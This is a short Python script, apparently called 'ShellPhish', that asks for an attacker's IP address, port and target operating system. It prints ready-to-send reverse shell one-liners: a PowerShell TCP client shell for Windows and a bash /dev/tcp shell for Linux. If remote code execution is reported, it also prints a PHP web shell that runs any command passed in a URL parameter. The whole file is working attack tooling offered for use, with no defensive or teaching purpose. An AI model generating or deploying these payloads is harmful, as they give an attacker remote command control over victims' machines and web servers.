logo = '''
 SSSSS H   H  EEEEE  L      L       PPPPP  H   H  I  SSSSS  H   H
S      H   H  E      L      L       P   P  H   H  I  S      H   H
 SSS   HHHHH  EEEE   L      L       PPPPP  HHHHH  I   SSS   HHHHH
     S H   H  E      L      L       P      H   H  I      S  H   H
 SSSSS H   H  EEEEE  LLLLL  LLLLL   P      H   H  I  SSSSS  H   H

'''
print(logo)

IP = input("Enter your IP for reverse shell: ")
PORT = input("Enter your port # for reverse shell: ")
OS = input("Provide target OS: ")
RCE = input("RCE detected? y/n: ")

powerfish = f"""
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    """
shellfish = f"""
bash -c 'exec bash -i &>/dev/tcp/{IP}/{PORT} <&1'
"""
remote_code_exec = f"""
<?php system($_GET["cmd"]);?>
"""

if OS.lower() == "windows":
    print(f"\nSEND TO TARGET --> {powerfish}")
elif OS.lower() == "linux":
    print(f"\nSEND TO TARGET --> {shellfish}")
else:
    print(f"\nUnrecognized OS: {OS}")

if RCE.lower() == "y":
    print(f"\nRCE COMMAND --> {remote_code_exec}")
else:
    print("Exiting ShellPhish...")